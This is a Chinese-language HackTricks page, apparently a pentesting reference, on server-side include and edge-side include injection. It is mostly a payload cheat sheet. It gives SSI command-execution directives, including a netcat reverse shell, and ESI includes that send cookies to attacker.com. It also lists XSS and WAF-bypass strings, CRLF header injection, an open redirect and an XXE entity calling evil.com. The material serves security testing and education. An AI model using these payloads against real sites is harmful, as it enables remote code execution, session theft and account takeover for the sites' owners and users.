# 服务器端包含/边缘端包含注入

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中被广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 服务器端包含基本信息

（定义摘自[这里](https://httpd.apache.org/docs/current/howto/ssi.html)）

SSI（服务器端包含）是放置在HTML页面中的指令，**在服务器上进行评估**，而页面正在提供时。它们允许您**向现有HTML页面添加动态生成的内容**，而无需通过CGI程序或其他动态技术提供整个页面。\
例如，您可以将指令放入现有HTML页面中，如：

`<!--#echo var="DATE_LOCAL" -->`

当提供页面时，此片段将被评估并替换为其值：

`Tuesday, 15-Jan-2013 19:28:54 EST`

何时使用SSI，何时让页面完全由某个程序生成，通常取决于页面有多少是静态的，有多少需要在每次提供页面时重新计算。SSI是向页面添加小块信息的绝佳方式，例如上面显示的当前时间。但是，如果页面的大部分是在提供时生成的，您需要寻找其他解决方案。

如果Web应用程序使用扩展名为\*\* `.shtml`、`.shtm`或`.stm` \*\*的文件，则可以推断存在SSI，但情况并非总是如此。

典型的SSI表达式具有以下格式：
```
<!--#directive param="value" -->
```
### 检查
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## 边缘包含

在缓存信息或动态应用程序时可能会出现问题，因为内容的一部分可能会在下次检索内容时发生变化。这就是ESI的用途，通过使用ESI标记指示需要在发送缓存版本之前生成的动态内容。\
如果攻击者能够在缓存内容中注入ESI标记，那么他就可以在将文档发送给用户之前注入任意内容。

### ESI检测

从服务器响应中的以下标头表示服务器正在使用ESI：
```
Surrogate-Control: content="ESI/1.0"
```
如果您找不到此标头，则服务器**可能仍在使用ESI**。\
**也可以使用盲目利用方法**，因为请求应该发送到攻击者的服务器：
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI利用

[GoSecure](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)创建了一个表格，帮助我们了解针对不同支持ESI的软件可以尝试的可能攻击，具体取决于支持的功能。首先让我们解释下面表格中列名的含义：

- **Includes**：支持`<esi:includes>`指令
- **Vars**：支持`<esi:vars>`指令。用于绕过XSS过滤器
- **Cookie**：文档cookie对ESI引擎可访问
- **Upstream Headers Required**：除非上游应用程序提供标头，否则代理应用程序将不会处理ESI语句
- **Host Allowlist**：在这种情况下，ESI包含仅可能来自允许的服务器主机，例如，只有对这些主机才可能进行SSRF

|         **软件**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :----------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|         Squid3           |      是      |    是    |     是      |              是               |         否         |
|      Varnish Cache       |      是      |    否    |     否      |              是               |         是         |
|         Fastly           |      是      |    否    |     否      |              否               |         是         |
| Akamai ESI 测试服务器 (ETS) |      是      |    是    |     是      |              否               |         否         |
|       NodeJS esi         |      是      |    是    |     是      |              否               |         否         |
|      NodeJS nodesi       |      是      |    否    |     否      |              否               |      可选的       |

#### XSS

以下ESI指令将在服务器响应中加载任意文件
```markup
<esi:include src=http://attacker.com/xss.html>
```
文件 _http://attacker.com/xss.html_ 可能包含类似 `<script>alert(1)</script>` 的 XSS 负载

#### 绕过客户端 XSS 保护
```markup
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### 窃取 Cookie

* 远程窃取 cookie
```markup
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* 通过在响应中反射XSS来窃取HTTP\_ONLY cookie：
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->
```
<figure><img src="../.gitbook/assets/image (4) (7).png" alt=""><figcaption></figcaption></figure>

* 通过反射cookie实现完整账户接管

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

#### 私有本地文件

不要将其与“本地文件包含”混淆：
```markup
<esi:include src="secret.txt">
```
#### CRLF

CRLF (Carriage Return Line Feed) refers to the sequence of characters used to denote a line break in HTTP headers. It consists of the ASCII characters 13 (CR) and 10 (LF), which represent the carriage return and line feed, respectively. Attackers can exploit CRLF injection vulnerabilities to manipulate HTTP responses, insert additional headers, or perform other malicious activities.
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### 开放式重定向

以下内容将向响应添加一个 `Location` 头部
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### 添加标题

* 在强制请求中添加标题
```html
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* 在响应中添加标头（用于绕过带有 XSS 的响应中的 "Content-Type: text/json"）
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->
```
<figure><img src="../.gitbook/assets/image (5) (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

#### 在添加标头中的CRLF (**CVE-2019-2438)**
```markup
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai 调试

这将发送包含在响应中的调试信息：
```markup
<esi:debug/>
```
### ESI + XSLT = XXE

还可以通过将 `xslt` 值指定为 _dca_ 参数来添加基于 **eXtensible Stylesheet Language Transformations (XSLT)** 的 ESI 包含。以下包含将导致 HTTP 代理请求 XML 和 XSLT 文件。然后使用 XSLT 文件来过滤 XML 文件。这个 XML 文件可以用来执行 _XML External Entity (XXE)_ 攻击。这允许攻击者执行 SSRF 攻击，但这并不是很有用，因为必须通过 ESI 包含执行此操作，而 ESI 本身就是一个 SSRF 向量。由于底层库（Xalan）不支持，外部 DTD 不会被解析。这意味着我们无法提取本地文件。
```markup
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLT文件：
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
检查XSLT页面：

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### 参考资料

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

<details>

<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
